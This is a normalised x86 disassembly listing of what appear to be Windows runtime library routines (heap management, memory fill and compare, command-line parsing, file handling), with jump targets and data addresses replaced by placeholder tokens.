mov edx [ edi ]
dec [ edx ]
mov bl 0x1
jmp r-xdata
mov ecx [ edi ]
cmp esi [ ecx + eax * 4 + 0x4 ]
jne r-xdata
sub_4024fc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
sub eax rw-data
shr eax 0x5
shl eax 0x8
mov edx [ ebp + 0x8 ]
lea esi [ edx + eax * 8 - 0x1b800 ]
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4021a0
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
jbe r-xdata
mov eax [ ebp - 0x18 ]
sub eax 0x4
test [ eax ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
movzx eax [ eax + 0x2 ]
add [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_4024a4
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1b801 ] 0x0
xor ebx ebx
mov eax [ ebp - 0x18 ]
call sub_4023c8
mov edi eax
test edi edi
jne r-xdata
mov ebx 0x2
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x100
jae r-xdata
cmp ebx 0xff
jg r-xdata
cmp [ esi + ebx * 8 ] 0x0
je r-xdata
inc [ esi + ebx * 8 + 0x4 ]
mov eax [ ebp - 0x18 ]
add eax 0x4
mov eax [ eax ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
xor ebx ebx
mov [ esi + ebx * 8 ] edi
jmp r-xdata
inc ebx
cmp ebx 0xff
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
movzx eax [ eax + 0x2 ]
sub eax 0xd
cmp eax [ ebp - 0xc ]
jle r-xdata
cmp edi [ esi + ebx * 8 ]
je r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0xc ]
test eax eax
jle r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x20
jb r-xdata
mov ebx 0x1
jmp r-xdata
mov [ ebp - 0x11 ] al
inc [ ebp - 0x10 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x80
jb r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov al 0x1
sub_402648
push ebp
mov ebp esp
push eax
mov eax 0x27
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffff6dc
push ebx
push esi
push edi
lea eax [ ebp - 0x1b800 ]
xor ecx ecx
mov edx 0x1b800
call sub_403728
lea eax [ ebp - 0x1f828 ]
xor ecx ecx
mov edx 0x4000
call sub_403728
xor eax eax
mov [ ebp - 0x1b808 ] eax
mov [ ebp - 0x1b801 ] 0x1
mov edi [ rw-data ]
jmp r-xdata
cmp edi rw-data
jne r-xdata
mov eax edi
call sub_402160
mov ebx eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov edi [ edi + 0x4 ]
mov eax ebx
sub eax 0x4
mov esi [ eax ]
test esi 0x1
jne r-xdata
cmp ebx rw-data
je r-xdata
mov eax ebx
call sub_40213c
mov ebx eax
test ebx ebx
jne r-xdata
test esi 0x4
je r-xdata
cmp [ ebp - 0x1b801 ] 0x0
jne r-xdata
cmp [ ebp - 0x1b808 ] 0x1000
jl r-xdata
cmp [ ebp - 0x1b808 ] 0x1000
jge r-xdata
push ebp
mov eax ebx
call sub_4024fc
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1b809 ] 0x0
xor eax eax
mov [ ebp - 0x1b818 ] eax
lea edx [ ebp - 0x27828 ]
mov eax r-xdata
mov ecx 0x28
call sub_4022f8
mov ebx eax
mov [ ebp - 0x1b810 ] 0x37
mov [ ebp - 0x1b824 ] rw-data
lea eax [ ebp - 0x1b004 ]
mov [ ebp - 0x1b828 ] eax
mov eax ebx
add eax 0x10
call sub_4024a4
test al al
jne r-xdata
and esi 0xfffffff0
sub esi 0x4
mov [ ebp - 0x1b814 ] esi
mov eax ebx
call sub_4024a4
test al al
jne r-xdata
mov eax [ ebp - 0x1b81c ]
mov [ ebp - 0x1b818 ] eax
add [ ebp - 0x1b828 ] 0x800
add [ ebp - 0x1b824 ] 0x20
dec [ ebp - 0x1b810 ]
jne r-xdata
cmp [ esi ] 0x0
jbe r-xdata
mov ebx [ ebx + 0x4 ]
mov [ ebp - 0x1b801 ] 0x0
mov esi [ ebx + 0xc ]
and esi 0xfffffff0
sub esi 0x4
sub esi 0x10
mov eax [ ebp - 0x1b808 ]
mov [ ebp + eax * 4 - 0x1f828 ] esi
inc [ ebp - 0x1b808 ]
mov [ ebp - 0x1b801 ] 0x0
mov eax [ ebp - 0x1b808 ]
mov edx [ ebp - 0x1b814 ]
mov [ ebp + eax * 4 - 0x1f828 ] edx
inc [ ebp - 0x1b808 ]
mov eax [ ebp - 0x1b824 ]
movzx eax [ eax ]
sub eax 0x4
mov [ ebp - 0x1b81c ] eax
mov [ ebp - 0x1b80a ] 0x0
mov edi 0xff
mov eax [ ebp - 0x1b828 ]
mov esi eax
cmp [ ebp - 0x1b808 ] 0x0
jle r-xdata
dec edi
sub esi 0x8
cmp edi 0xffffffff
jne r-xdata
cmp [ ebp - 0x1b809 ] 0x0
jne r-xdata
mov eax r-xdata
mov ecx 0x3
mov edx ebx
call sub_4022f8
push 0x2010
push r-xdata
lea eax [ ebp - 0x27828 ]
push eax
push 0x0
call sub_4012a8
cmp [ ebp - 0x1b809 ] 0x0
je r-xdata
lea eax [ ebp - 0x20029 ]
cmp ebx eax
ja r-xdata
cmp [ ebp - 0x1b80a ] 0x0
jne r-xdata
mov eax r-xdata
mov ecx 0x27
mov edx ebx
call sub_4022f8
mov ebx eax
mov [ ebp - 0x1b809 ] 0x1
mov eax r-xdata
mov ecx 0x3c
mov edx ebx
call sub_4022f8
mov ebx eax
mov edi [ ebp - 0x1b808 ]
dec edi
test edi edi
jb r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov [ ebx ] 0x2c
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov eax [ ebp - 0x1b818 ]
inc eax
mov edx ebx
call sub_4021dc
mov ebx eax
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x2d
inc ebx
mov [ ebx ] 0x20
inc ebx
mov edx ebx
mov eax [ ebp - 0x1b81c ]
call sub_4021dc
mov ebx eax
mov eax r-xdata
mov ecx 0x8
mov edx ebx
call sub_4022f8
mov ebx eax
mov [ ebp - 0x1b80a ] 0x1
jmp r-xdata
inc edi
mov [ ebp - 0x1b820 ] 0x0
lea esi [ ebp - 0x1f828 ]
mov eax r-xdata
mov ecx 0x7
mov edx ebx
call sub_4022f8
mov ebx eax
jmp r-xdata
je r-xdata
mov eax edi
sub eax 0x1
jb r-xdata
mov eax [ esi ]
mov edx ebx
call sub_4021dc
mov ebx eax
lea eax [ ebp - 0x20029 ]
cmp ebx eax
ja r-xdata
mov [ ebx ] 0x2c
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x78
inc ebx
mov [ ebx ] 0x20
inc ebx
mov eax [ esi ]
mov edx ebx
call sub_4021dc
mov ebx eax
mov eax r-xdata
mov ecx 0x6
mov edx ebx
call sub_4022f8
mov ebx eax
jmp r-xdata
jmp r-xdata
inc [ ebp - 0x1b820 ]
add esi 0x4
dec edi
jne r-xdata
lea edx [ ebp - 0x27928 ]
mov eax [ esi - 0x4 ]
call sub_403e44
movzx ecx [ ebp - 0x27928 ]
lea eax [ ebp - 0x27927 ]
mov edx ebx
call sub_4022f8
mov ebx eax
cmp [ ebp - 0x1b820 ] 0x0
je r-xdata
sub_402ac0
push esi
push edi
xor eax eax
xor esi esi
mov edx rw-data
movzx edi [ edx ]
shr edi 0x3
mov ecx esi
add ecx ecx
add ecx ecx
cmp edi eax
jbe r-xdata
test [ edx ] 0xf
jne r-xdata
mov eax edi
mov [ eax + rw-data ] cl
inc eax
cmp edi eax
ja r-xdata
inc esi
add edx 0x20
cmp esi 0x37
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
retn
sub_402b04
push ebx
push esi
push edi
mov esi 0x37
mov ebx rw-data
lea eax [ ebx - 0x1c ]
mov [ ebx - 0x8 ] eax
lea eax [ ebx - 0x1c ]
mov [ ebx - 0x18 ] eax
xor eax eax
mov [ ebx - 0x10 ] eax
mov [ ebx - 0x14 ] 0x1
movzx eax [ ebx - 0x1a ]
add eax eax
add eax eax
lea eax [ eax + eax * 2 ]
add eax 0xef
and eax 0xffffff00
add eax 0x30
cmp eax 0xb30
jae r-xdata
mov [ ebx ] sub_40158c
add eax 0x4d0
shr eax 0xd
cmp eax 0x7
jbe r-xdata
mov eax 0xb30
mov ecx eax
mov dl 0xff
shl dl cl
mov [ ebx - 0x1b ] dl
shl eax 0xd
add ax 0xb30
mov [ ebx - 0x4 ] ax
movzx edi [ ebx - 0x1a ]
movzx eax di
mov ecx eax
shl ecx 0x4
lea ecx [ ecx + ecx * 2 ]
add ecx 0xef
and ecx 0xffffff00
add ecx 0x30
cmp ecx 0x7330
jae r-xdata
mov eax 0x7
cmp ecx 0xff30
jbe r-xdata
mov ecx 0x7330
mov eax ecx
sub eax 0x20
movzx edx di
mov ecx edx
xor edx edx
div ecx
imul di
add ax 0xef
and ax 0xff00
add ax 0x30
mov [ ebx - 0x2 ] ax
add ebx 0x20
dec esi
jne r-xdata
mov ecx 0xff30
cmp [ ebx ] 0x0
jne r-xdata
call sub_402ac0
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
mov esi 0x400
mov edx rw-data
mov eax edx
mov [ eax ] eax
mov [ eax + 0x4 ] eax
add edx 0x8
dec esi
jne r-xdata
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
pop edi
pop esi
pop ebx
retn
sub_402c2c
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi [ ebx + 0x4 ]
jmp r-xdata
cmp edi ebx
jne r-xdata
mov ebp [ edi + 0x4 ]
push 0x8000
push 0x0
push edi
call VirtualFree
mov edi ebp
mov edx 0x37
mov eax rw-data
mov ecx eax
mov [ eax + 0x14 ] ecx
mov ecx eax
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
xor ecx ecx
mov [ eax + 0xc ] ecx
add eax 0x20
dec edx
jne r-xdata
mov [ ebx ] ebx
mov [ ebx + 0x4 ] ebx
mov edx 0x400
mov ecx rw-data
mov eax ecx
mov [ eax ] eax
mov [ eax + 0x4 ] eax
add ecx 0x8
dec edx
jne r-xdata
mov ebx [ esi + 0x4 ]
jmp r-xdata
cmp ebx esi
jne r-xdata
mov edi [ ebx + 0x4 ]
push 0x8000
push 0x0
push ebx
call VirtualFree
mov ebx edi
mov [ esi ] esi
mov [ esi + 0x4 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_402cbc
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call sub_4013e4
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
call sub_402648
call sub_402c2c
retn
push 0x8000
push 0x0
mov eax [ rw-data ]
push eax
call VirtualFree
xor eax eax
mov [ rw-data ] eax
sub_402d5c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402e78
mov [ ecx ] eax
mov al 0x2
jmp sub_402e78
retn
mov [ ecx ] eax
retn
sub_402dec
push ebx
push esi
call sub_40710c
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_40710c
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_40710c
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_402e2c
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_40710c
mov ebx [ eax + 0x4 ]
jmp r-xdata
movzx eax bl
mov edx esi
call sub_402e20
movzx eax bl
movzx ebx [ eax + rw-data ]
sub_402ec0
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_402f04
push ebx
push esi
add esp 0xfffffdf0
mov esi edx
mov ebx eax
test bl bl
je r-xdata
lea eax [ esp + 0x4 ]
push eax
push 0x105
call GetCurrentDirectoryA
test bl bl
je r-xdata
movzx eax bl
add eax 0x41
dec eax
mov [ esp ] al
mov [ esp + 0x1 ] 0x3a
mov [ esp + 0x2 ] 0x0
lea eax [ esp + 0x109 ]
push eax
push 0x105
call GetCurrentDirectoryA
push esp
call sub_401350
mov eax esi
lea edx [ esp + 0x4 ]
mov ecx 0x105
call sub_4050b4
add esp 0x210
pop esi
pop ebx
retn
lea eax [ esp + 0x109 ]
push eax
call sub_401350
sub_402f9c
cmp eax edx
je r-xdata
retn
cmp ecx 0x20
ja r-xdata
jle r-xdata
sub ecx 0x8
jg r-xdata
retn
cmp eax edx
ja r-xdata
fild [ ecx + eax ]
fild [ eax ]
cmp ecx 0x8
jle r-xdata
jmp [ ecx * 4 + r-xdata ]
push edx
fild [ eax ]
lea eax [ ecx + eax - 0x8 ]
lea ecx [ edx + ecx - 0x8 ]
fild [ eax ]
push ecx
neg ecx
and edx 0xfffffff8
lea ecx [ edx + ecx + 0x8 ]
pop edx
sub edx ecx
cmp eax edx
lea edx [ ecx + edx ]
jbe r-xdata
fistp [ edx ]
fistp [ ecx + edx ]
fild [ eax + 0x8 ]
cmp ecx 0x10
jle r-xdata
fild [ ecx + eax ]
fistp [ ecx + edx ]
add ecx 0x8
jl r-xdata
fistp [ edx ]
pop edx
fistp [ edx ]
retn
sub ecx 0x8
push ecx
fild [ ecx + eax ]
fild [ eax ]
add ecx edx
and ecx 0xfffffff8
sub ecx edx
fistp [ edx + 0x8 ]
fild [ eax + 0x10 ]
fistp [ edx + 0x10 ]
fild [ ecx + eax ]
fistp [ ecx + edx ]
sub ecx 0x8
jg r-xdata
pop ecx
fistp [ edx ]
fistp [ ecx + edx ]
sub_40309c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp [ ebx ] 0x20
jbe r-xdata
xor ebp ebp
mov [ esp ] ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_401280
mov ebx eax
cmp [ ebx ] 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp [ ebx ] 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_4055ac
mov ebx [ esp ]
mov ebp [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_401280
mov edi eax
mov eax edi
sub eax ebx
add ebp eax
mov ebx edi
push ebx
call sub_401280
mov ebx eax
jmp r-xdata
cmp [ ebx ] 0x20
ja r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
push ebx
call sub_401280
mov edi eax
cmp edi ebx
jbe r-xdata
push ebx
call sub_401280
mov ebx eax
jmp r-xdata
push ebx
call sub_401280
mov ebx eax
jmp r-xdata
push ebx
call sub_401280
mov edi eax
mov eax edi
sub eax ebx
add ebp eax
mov ebx edi
movzx eax [ ebx ]
mov [ ebp + esi ] al
inc ebx
inc esi
cmp edi ebx
ja r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
push ebx
call sub_401280
mov ebx eax
jmp r-xdata
push ebx
call sub_401280
mov edi eax
cmp edi ebx
jbe r-xdata
movzx eax [ ebx ]
mov [ ebp + esi ] al
inc ebx
inc esi
cmp edi ebx
ja r-xdata
sub_403198
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_404e44
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_4012e8
mov ecx eax
mov edx esp
mov eax ebx
call sub_404f34
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40309c
mov edi eax
test esi esi
je r-xdata
sub_4031f8
add esp 0xfffffff8
push esp
call sub_401398
test eax eax
je r-xdata
call sub_4013a0
mov [ rw-data ] eax
pop ecx
pop edx
retn
mov eax [ esp ]
mov [ rw-data ] eax
pop ecx
pop edx
retn
sub_40326c
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_4032ac
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx ]
push eax
call sub_401250
test eax eax
jne r-xdata
xor eax eax
call sub_4012d8
cmp eax 0x6d
jne r-xdata
pop ebx
retn
xor eax eax
pop ebx
retn
sub_4032ec
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
test esi esi
jne r-xdata
push 0x0
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx ]
push eax
call sub_401278
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
call sub_4012d8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
xor edx edx
mov [ ebx + 0xc ] edx
sub_403338
push ebx
mov ebx eax
mov [ ebx + 0x4 ] 0xd7b0
mov eax [ ebx ]
call sub_403328
test al al
jne r-xdata
xor eax eax
pop ebx
retn
call sub_4012d8
pop ebx
retn
sub_403358
push esi
mov esi eax
xor eax eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov ax [ esi + 0x4 ]
sub eax 0xd7b1
je r-xdata
mov eax 0x80000000
mov edx 0x1
mov ecx 0x3
mov [ esi + 0x1c ] sub_4032ac
jmp r-xdata
dec eax
je r-xdata
mov [ esi + 0x24 ] sub_403338
mov [ esi + 0x20 ] sub_4032e8
cmp [ esi + 0x48 ] 0x0
je r-xdata
mov eax 0x40000000
mov edx 0x1
mov ecx 0x2
jmp r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x14c ]
mov [ esi + 0x8 ] 0x80
mov [ esi + 0x24 ] sub_4032e8
mov [ esi + 0x14 ] eax
cmp [ esi + 0x4 ] 0xd7b2
je r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ esi + 0x48 ]
push eax
call sub_401228
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x1c ] sub_4032ec
mov eax 0xc0000000
mov edx 0x1
mov ecx 0x3
jmp r-xdata
cmp esi rw-data
jne r-xdata
push 0xfffffff6
jmp r-xdata
mov [ esi + 0x4 ] 0xd7b0
call sub_4012d8
jmp r-xdata
mov [ esi ] eax
cmp [ esi + 0x4 ] 0xd7b3
jne r-xdata
pop esi
retn
push 0xfffffff5
push 0xfffffff4
jmp r-xdata
call sub_401240
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x4 ] 0xd7b1
je r-xdata
dec [ esi + 0x4 ]
push 0x0
push [ esi ]
call sub_401238
inc eax
je r-xdata
mov [ esi ] eax
xor eax eax
push [ esi ]
call GetFileType
test eax eax
je r-xdata
sub eax 0x81
jae r-xdata
push [ esi ]
call sub_401220
mov [ esi + 0x4 ] 0xd7b0
mov eax 0x69
jmp r-xdata
cmp eax 0x2
jne r-xdata
push 0x0
push 0x0
push eax
push [ esi ]
call sub_401268
inc eax
je r-xdata
xor eax eax
mov [ esi + 0x20 ] sub_4032ec
push 0x0
mov edx esp
push 0x0
push edx
push 0x80
lea edx [ esi + 0x14c ]
push edx
push [ esi ]
call sub_401250
pop edx
dec eax
jne r-xdata
xor eax eax
cmp [ esi + eax + 0x14c ] 0xe
je r-xdata
push 0x2
push 0x0
sub eax edx
push eax
push [ esi ]
call sub_401268
inc eax
je r-xdata
inc eax
jmp r-xdata
push [ esi ]
call sub_401260
dec eax
jne r-xdata
cmp eax edx
jae r-xdata
jmp r-xdata
sub_403504
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
xor ecx ecx
mov edx 0x14c
call sub_403728
lea eax [ ebx + 0x14c ]
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x4 ] 0xd7b0
movzx eax [ rw-data ]
mov [ ebx + 0x6 ] ax
mov [ ebx + 0x8 ] 0x80
mov [ ebx + 0x18 ] sub_403358
mov eax esi
call sub_405120
push eax
mov eax esi
call sub_405324
lea edx [ ebx + 0x48 ]
pop ecx
call sub_402f9c
mov eax esi
call sub_405120
mov [ ebx + eax + 0x48 ] 0x0
xor eax eax
pop esi
pop ebx
retn
sub_40356c
push ebx
movzx ecx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402ea4
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_4035c0
push ebx
push esi
mov ebx eax
xor esi esi
movzx eax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402ea4
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402ea4
jmp r-xdata
sub_403618
push ebx
movzx ebx [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
movzx ecx cl
xchg edx eax
call sub_402f9c
pop ebx
retn
mov ecx ebx
sub_403634
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_4036b8
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_403728
cmp edx 0x20
mov ch cl
jl r-xdata
test edx edx
jle r-xdata
mov [ eax ] cx
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] cx
sub edx 0x10
fld [ eax ]
fst [ edx + eax ]
fst [ edx + eax + 0x8 ]
mov ecx eax
and ecx 0x7
sub ecx 0x8
sub eax ecx
add edx ecx
add eax edx
neg edx
retn
mov [ edx + eax - 0x1 ] cl
and edx 0xfffffffe
neg edx
lea edx [ edx * 2 + r-xdata ]
jmp edx
fst [ edx + eax ]
fst [ edx + eax + 0x8 ]
add edx 0x10
jl r-xdata
ffree st0
retn
mov [ eax + 0x1c ] cx
mov [ eax + 0x1a ] cx
mov [ eax + 0x18 ] cx
mov [ eax + 0x16 ] cx
mov [ eax + 0x14 ] cx
mov [ eax + 0x12 ] cx
mov [ eax + 0x10 ] cx
mov [ eax + 0xe ] cx
mov [ eax + 0xc ] cx
mov [ eax + 0xa ] cx
mov [ eax + 0x8 ] cx
mov [ eax + 0x6 ] cx
mov [ eax + 0x4 ] cx
mov [ eax + 0x2 ] cx
mov [ eax ] cx
retn
sub_4037c4
push ebx
push esi
mov ebx eax
mov [ ebx + 0x4 ] 0xd7b0
xor esi esi
mov eax [ ebx ]
call sub_403328
test al al
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_402eb4
mov esi 0x1
sub_4037ec
push ebx
push esi
push edi
mov esi edx
mov edi ecx
xor edx edx
mov ebx eax
mov dx [ eax + 0x4 ]
sub edx 0xd7b0
je r-xdata
mov [ ebx + 0x4 ] 0xd7b3
mov [ ebx + 0x8 ] esi
mov [ ebx + 0x24 ] sub_4037c4
mov [ ebx + 0x1c ] sub_4032e8
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp edx 0x3
ja r-xdata
mov [ ebx + 0x24 ] sub_4032e8
cmp edi 0x3
je r-xdata
mov eax 0xc0000000
mov dl [ rw-data ]
and edx 0x70
shr edx 0x2
mov edx [ edx + rw-data ]
mov ecx 0x2
sub edi 0x3
je r-xdata
mov eax 0x66
jmp r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
push 0xfffffff5
push 0xfffffff6
jmp r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ ebx + 0x48 ]
push eax
call sub_401228
mov ecx 0x3
inc edi
je r-xdata
call sub_402ea4
call sub_402ea4
cmp eax 0xffffffff
je r-xdata
call sub_401240
jmp r-xdata
mov [ ebx + 0x4 ] 0xd7b0
call sub_4012d8
mov [ ebx ] eax
jmp r-xdata
mov eax 0x40000000
inc edi
mov [ ebx + 0x4 ] 0xd7b2
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax 0x80000000
mov [ ebx + 0x4 ] 0xd7b1
sub_4038d8
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
